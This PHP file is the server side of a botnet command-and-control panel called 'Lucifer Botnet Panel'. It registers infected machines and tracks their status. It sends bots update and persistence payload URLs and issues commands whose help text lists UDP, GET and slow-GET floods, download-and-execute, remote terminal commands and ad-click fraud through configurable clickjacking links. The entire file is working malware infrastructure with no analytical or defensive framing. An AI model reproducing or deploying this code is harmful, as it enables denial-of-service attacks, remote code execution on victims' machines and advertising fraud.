<?PHP

error_reporting(E_ALL); ini_set('display_errors','1');

// Stylesheet
$style = '
	<style>
	* {
		margin: 0px;
	}
	body {
		background: #080808;
		color: #CCCCCC;
		font-family: "Arial Narrow", Arial, sans-serif;
		text-align: center;
	}
	input, select, textarea {
		background: #666666;
		color: #FFFFFF;
		border: 1px solid #999999;
		width: 200px;
		margin: 3px;
	}
	input:hover, select:hover, textarea:hover {
		border: 1px solid #FFFFFF;
	}
	textarea {
		height: 200px;
		width: 600px;
	}
	table {
		border: 1px solid #333333;
		margin-left: auto;
		margin-right: auto;
		width: 90%;
		border-radius: 3px;
	}
	tr {
		background: #222222;
	}
	tr:hover {
		background: #333333;
	}
	td {
		padding-left: 2px;
		padding-right: 2px;
	}
	td[\'colspan=2\']
	.cmd {
		max-width: 50%;
		text-align: center;
		margin-left: auto;
		margin-right: auto;
	}
	.help {
		width: 100%;
		text-align: left;
	}
	.mid {
		text-align: center;
		font-size: 16px;
		background: #333333;
	}
	.clear, .clear:hover {
		border: none;
		background: none;
	}
	a {
		text-decoration: none;
		color: #777777;
		transition: .4s;
	}
	a:hover {
		color: #CC0000;
	}
	tr a {
		color: #9F9F9F;
	}
	</style>';

$load = sys_getloadavg()[0];

if ($load > 90) {
	die("!knocktime 1800");
}

// Start database configuration
$host = "localhost";
$username = "root";
$password = "yourpass";
$database = "bot";

$details = "mysql:dbname=".$database.";host=".$host;
try {
	@$db = new PDO($details, $username, $password);
} catch(PDOException $error) {
	die("x");
}
// End database configuration

function convert_time($init) {
	$out = "";
	$days = floor($init / 86400);
	$hours = floor(($init / 3600) % 24);
	$minutes = floor(($init / 60) % 60);
	$seconds = $init % 60;

	if ($days > 0) { $out .= "$days days, "; }
	if ($hours > 0) { $out .= "$hours hours, "; }
	if ($minutes > 0) { $out .= "$minutes minutes and "; }

	return $out.$seconds." seconds";
}

foreach ($db->query("SELECT * FROM settings") as $x) { $settings = $x; }
$clickjacklinks = explode("\r\n", $settings['clickjacklinks']);

if ($load > 80) {
	$knocktime = $settings['knocktime'] * 2;
} else if ($load > 70) {
	$knocktime = $settings['knocktime'] * 1.5;
} else {
	$knocktime = $settings['knocktime'];
}

$deadtime = $settings['deadtime'];
$connectwait = 2;
$onlinebots = 0;
$offlinebots = 0;
$deadbots = 0;
$perday = 86400 / $knocktime;
$torzip = "https://www.torproject.org/dist/torbrowser/4.5.1/tor-win32-0.2.6.7.zip";

$bullshit = "!knocktime ".$knocktime;

$downloadurl = 'http://127.0.0.1/start.exe';
$persisturl = 'http://127.0.0.1/persist.exe';
if (isset($_POST['os'])) {
	$os = explode(" ", $_POST['os']);
	if ($os[0] == "Linux") {
		$currentversion = $settings['nix_version'];
		$persisturl = $settings['nix_persisturl'];
		$downloadname = $settings['nix_downloadname'];
	} else {
		$currentversion = $settings['win_version'];
		$persisturl = $settings['win_persisturl'];
		$downloadname = $settings['nix_downloadname'];
	}
}

$time = round(microtime(true));

if (isset($_POST['persist']) & isset($_POST['os'])) {
	echo $persisturl;
	die();
}

if (isset($_POST['knocktime'])) {
	print $knocktime;	
	die();
}

if (isset($_POST['torzip'])) {
	print $torzip;	
	die();
}

if (isset($_POST['id']) & isset($_POST['version']) & isset($_POST['os']) & isset($_POST['ip']) & isset($_POST['country'])) {

	if ($_POST['version'] < $currentversion) {
		echo '!update '.$downloadurl.' '.$downloadname;
	}
	
	foreach ($db->query("SELECT * FROM bots") as $ids) {
		$used[] = $ids['id'];
	}
	
	if (in_array($_POST['id'], $used)) {
		/*
		foreach ($db->query("SELECT * FROM bots WHERE id=".$_POST['id']) as $bot) {
			$lasttime = round($bot['connect']);
			if ($lasttime < $knocktime) { die($bullshit); }
		}
		*/
		$update = $db->prepare("UPDATE bots SET ip=?, country=?, idle=?, connect=?, version=? WHERE id=?;");
		$update->execute(array($_POST['ip'], $_POST['country'], $_POST['idle'], $time, $_POST['version'], $_POST['id']));
	} else {
		$new = $db->prepare("INSERT INTO `bots` (`id`, `os`, `ip`, 'country', 'idle', `connect`, `version`) VALUES (?, ?, ?, ?, ?, ?, ?);");
		$new->execute(array($_POST['id'], $_POST['os'], $_POST['ip'], $_POST['country'], $_POST['idle'], $time, $_POST['version']));
	}
	
	foreach ($db->query("SELECT * FROM status") as $command) {
		$timeago = $time - $command['time'];
		if ($command['botid'] == '' || $command['botid'] == $_POST['id']) {
			if ($timeago < $knocktime) {
				echo $command['status'];
			} else {
				if (mt_rand(0, $perday) < $settings['clicksperday'] & $_POST['idle'] > $settings['idletime']) {
					shuffle($clickjacklinks);
					echo "!click ".$clickjacklinks[0];
				} else { die($bullshit); }
			}
		}
	}
}

if (isset($_GET['panel'])) {

	if (isset($_GET['bots'])) {
		$getinc = ""; $getstuff = array();
		if (isset($_GET['cmd'])) { $getstuff[] .= "cmd"; }
		if (isset($_GET['settings'])) { $getstuff[] .= "settings"; }
		foreach ($getstuff as $x) {
			$getinc .= $x."&";
		}
		$bottommenu = "<a href='?panel=all&{$getinc}bots'><b>All Bots</b></a> ||
		<a href='?panel=online&{$getinc}bots'><b>Online Bots</b></a> ||
		<a href='?panel=offline&{$getinc}bots'><b>Offline Bots</b></a> ||
		<a href='?panel=active&{$getinc}bots'><b>Active Bots</b></a> ||
		<a href='?panel=dead&{$getinc}bots'><b>Dead Bots</b></a>";

		if (isset($_GET['del'])) {
			$del = $db->prepare("DELETE FROM bots WHERE id = ? LIMIT 1;");
			if ($del->execute(array($_GET['del']))) { echo "Deleted"; }
		}

		foreach ($db->query("SELECT * FROM bots") as $bot) {
			$lasttime = round($bot['connect']);
			$disptime = $time - $lasttime;
			if ($disptime > $knocktime) {
				$lastconnect = "<span style='color: #CC0000;'>".convert_time($disptime)."</span>";
			} else {
				$lastconnect = convert_time($disptime);
			}
			$info = '<tr><td>'.$bot['id']."</td><td>".$bot['version']."</td><td>".$bot['os']."</td><td>".$bot['ip']."</td><td>".$bot['country']."</td><td>".convert_time($bot['idle'])."</td><td>".$lastconnect."</td><td style='text-align: center;'><a href='?panel={$_GET['panel']}&{$getinc}bots&del={$bot['id']}'>X</a></td></tr>";
			$offlinetime = $knocktime * 3;
			if ($disptime <= $offlinetime) {
				$online[] = $info;
				$onlinebots++;
			} else if ($disptime <= $deadtime) {
				$offlinebots++;
				$offline[] = $info;
			} else {
				$deadbots++;
				$dead[] = $info;
			}
		}
		$totalbots = $onlinebots + $offlinebots;
	} else {
		foreach ($db->query("SELECT * FROM bots") as $bot) {
			$lasttime = round($bot['connect']);
			$disptime = $time - $lasttime;
			$offlinetime = $knocktime * 3;
			if ($disptime <= $offlinetime) {
				$onlinebots++;
			} else if ($disptime <= $deadtime) {
				$offlinebots++;
			} else {
				$deadbots++;
			}
		}
		$totalbots = $onlinebots + $offlinebots;
	}

	$toprow = "<tr><td>Bot ID</td><td>Version</td><td>Operating System</td><td>IP Address</td><td>Country</td><td>Idle</td><td>Last Connection</td><td></td></tr>";
	
	$title = "Lucifer [{$onlinebots}/{$totalbots}]";
	echo "<html>
		<head>
			<title>{$title}</title>
			<style>
			{$style}
			</style>
		</head>
		<body>
			Lucifer Botnet Panel [".$load."%]<br>
			<a href='?panel=online&settings&cmd&bots'><b>Home</b></a> ||
			<a href='?panel&settings'><b>Settings</b></a> ||
			<a href='?panel=online&cmd&bots'><b>Bots</b></a> ||
			<a href='?panel=active&settings&bots'><b>Info</b></a>
			<br>";
			if (isset($_GET['bots'])) {
				echo $bottommenu;
			}
			echo "<br>";
			if (isset($_GET['cmd'])) {
				echo "
				<form method='POST' class='cmd'>
					<table style='text-align: center;'>
						<tr><td><label for='botid'>Bot ID:</label></td><td><input type='text' value='' name='botid' /></td></tr>
						<tr><td><label for='command'>Command:</label></td><td><input type='text' value='!udp 127.0.0.1 80 3600 10' name='command' required /></td></tr>
						<tr><td colspan='4'><input type='submit' /></td></tr>";
						if (isset($_POST['botid']) & isset($_POST['command'])) {
							$status = $db->prepare("UPDATE status SET botid = ?, status = ?, time = ?;");
							$status->execute(array($_POST['botid'], $_POST['command'], $time));
							echo '<tr><td colspan="4">Command '.$_POST['command'].' sent successfully.</td></tr>';
						}
						echo "
					</table>
				</form>
				<table>
				<tr><td colspan='3'>Help:</td></tr>
				<tr>
				<td>UDP FLOOD: !udp ip port time threads<br>GET FLOOD: !get url port time threads<br>SLOW GET FLOOD: !getslow url port time threads<br></td>
				<td>DOWNLOAD: !download url filename<br>DOWNLOAD & EXEC: !downloadexec url filename</td>
				<td>TERMINAL/CMD: !terminal command<br>CLICK AD: !click url</td>
				</tr>
				</table><br>";
			}
			if (isset($_GET['settings'])) {
				echo "
				<form method='POST'>
				<table>
				<tr><td colspan='4' style='text-align: center;'><a href='?panel=settings'><b>Settings</b></a></td></tr>";
				if (isset($_POST['settingschange'])) {
					$knocktimeupdate = $db->prepare("UPDATE settings SET knocktime=? WHERE id=?;");
					$knocktimeupdate->execute(array($_POST['knocktimeupdate'], '1'));
					$deadtimeupdate = $db->prepare("UPDATE settings SET deadtime=? WHERE id=?;");
					$deadtimeupdate->execute(array($_POST['deadtimeupdate'], '1'));
					$winversionupdate = $db->prepare("UPDATE settings SET win_version=? WHERE id=?;");
					$winversionupdate->execute(array($_POST['winversionupdate'], '1'));
					$nixversionupdate = $db->prepare("UPDATE settings SET nix_version=? WHERE id=?;");
					$nixversionupdate->execute(array($_POST['nixversionupdate'], '1'));
					$windownloadupdate = $db->prepare("UPDATE settings SET win_downloadurl=? WHERE id=?;");
					$windownloadupdate->execute(array($_POST['windownloadupdate'], '1'));
					$nixdownloadupdate = $db->prepare("UPDATE settings SET nix_downloadurl=? WHERE id=?;");
					$nixdownloadupdate->execute(array($_POST['nixdownloadupdate'], '1'));
					$windownloadname = $db->prepare("UPDATE settings SET win_downloadname=? WHERE id=?;");
					$windownloadname->execute(array($_POST['windownloadname'], '1'));
					$nixdownloadname = $db->prepare("UPDATE settings SET nix_downloadname=? WHERE id=?;");
					$nixdownloadname->execute(array($_POST['nixdownloadname'], '1'));
					$winpersistupdate = $db->prepare("UPDATE settings SET win_persisturl=? WHERE id=?;");
					$winpersistupdate->execute(array($_POST['winpersistupdate'], '1'));
					$nixpersistupdate = $db->prepare("UPDATE settings SET nix_persisturl=? WHERE id=?;");
					$nixpersistupdate->execute(array($_POST['nixpersistupdate'], '1'));
					$clicksperdayupdate = $db->prepare("UPDATE settings SET clicksperday=? WHERE id=?;");
					$clicksperdayupdate->execute(array($_POST['clicksperdayupdate'], '1'));
					$clickjacklinksupdate = $db->prepare("UPDATE settings SET clickjacklinks=? WHERE id=?;");
					$clickjacklinksupdate->execute(array($_POST['clickjacklinksupdate'], '1'));
					$idletimeupdate = $db->prepare("UPDATE settings SET idletime=? WHERE id=?;");
					$idletimeupdate->execute(array($_POST['idletimeupdate'], '1'));
					$settings = null;
					foreach ($db->query("SELECT * FROM settings") as $x) { $settings = $x; }
					echo "<tr><td colspan='4' style='text-align: center;'>Changes saved.</td></tr>";
				}
				echo "
				<tr>
					<td>Knocktime</td><td><input type='text' name='knocktimeupdate' value='".$settings['knocktime']."' /></td>
					<td>Dead Time</td><td><input type='text' name='deadtimeupdate' value='".$settings['deadtime']."' /></td>
				</tr>
				<tr>
					<td>Windows Version</td><td><input type='text' name='winversionupdate' value='".$settings['win_version']."' /></td>
					<td>Posix Version</td><td><input type='text' name='nixversionupdate' value='".$settings['nix_version']."' /></td>
				</tr>
				<tr>
					<td>Windows Download URL</td><td><input type='text' name='windownloadupdate' value='".$settings['win_downloadurl']."' /></td>
					<td>Posix Download URL</td><td><input type='text' name='nixdownloadupdate' value='".$settings['nix_downloadurl']."' /></td>
				</tr>
				<tr>
					<td>Windows Download Filename</td><td><input type='text' name='windownloadname' value='".$settings['win_downloadname']."' /></td>
					<td>Posix Download Filename</td><td><input type='text' name='nixdownloadname' value='".$settings['nix_downloadname']."' /></td>
				</tr>
				<tr>
					<td>Windows Persist URL</td><td><input type='text' name='winpersistupdate' value='".$settings['win_persisturl']."' /></td>
					<td>Posix Persist URL</td><td><input type='text' name='nixpersistupdate' value='".$settings['nix_persisturl']."' /></td>
				</tr>
				<tr>
					<td>Clicks Per Day</td><td><input type='text' name='clicksperdayupdate' value='".$settings['clicksperday']."' /></td>
					<td>Idle Time</td><td><input type='text' name='idletimeupdate' value='".$settings['idletime']."' /></td>
				</tr>
				<tr>
					<td colspan='1'>ClickJacking URLs</td><td colspan='3'><textarea name='clickjacklinksupdate'>".$settings['clickjacklinks']."</textarea></td>
				</tr>
				<tr><td colspan='4' style='text-align: center;'><input type='submit' name='settingschange' value='Save Changes' /></td></tr>
				<tr><td colspan='4' style='text-align: center;'>Clicks per day should be set to the approximate number of clicks you would like to have each bot make per 24 hours of idle time.</td></tr>
				</table>
				</form><br>";
			}
			if (isset($_GET['bots'])) {
				echo "<table>";
				echo "<tr class='mid'><td colspan='8'><b>Total Bots: ".$totalbots."</b></td></tr>";
				echo "<tr class='mid'><td colspan='8'><b>Online Bots: ".$onlinebots."</b></td></tr>";
				if ($_GET['panel'] == 'online' || $_GET['panel'] == 'all' || $_GET['panel'] == 'active') {
					echo $toprow;
					if (isset($online)) {
						foreach (array_reverse($online) as $row) {
							echo $row;
						}
					}
				}

				echo "<tr class='mid'><td colspan='8'><b>Offline Bots: ".$offlinebots."</b></td></tr>";
				if ($_GET['panel'] == 'offline' || $_GET['panel'] == 'all' || $_GET['panel'] == 'active') {
					echo $toprow;
					if (isset($offline)) {
						foreach (array_reverse($offline) as $row) {
							echo $row;
						}
					}
				}

				echo "<tr class='mid'><td colspan='8'><b>Dead Bots: ".$deadbots."</b></td></tr>";
				if ($_GET['panel'] == 'dead' || $_GET['panel'] == 'all') {
					echo $toprow;
					if (isset($dead)) {
						foreach (array_reverse($dead) as $row) {
							echo $row;
						}
					}
				}
				echo "</table><br>";
			}
			echo "<br>
		</body>
	</html>";
}

?>
